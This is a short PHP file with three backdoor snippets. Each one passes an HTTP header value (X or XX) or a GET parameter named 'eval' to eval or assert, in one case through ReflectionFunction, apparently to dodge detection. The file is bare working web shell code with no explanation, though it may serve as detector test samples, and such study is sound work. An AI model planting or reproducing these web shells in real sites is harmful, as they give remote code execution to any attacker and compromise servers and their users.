<?php

class foo
{
    function f($a){
        return eval($a);
    }
}
$f=new foo();
echo $f->f($_SERVER['HTTP_X']);

?>

<?php
function f($a){
    return eval($a);
}
f($_SERVER['HTTP_XX']);

?>


<?php
function hehe($a){
    return assert($a);
}
$fa = new ReflectionFunction("hehe");
$fa->invoke($_GET['eval']);
?>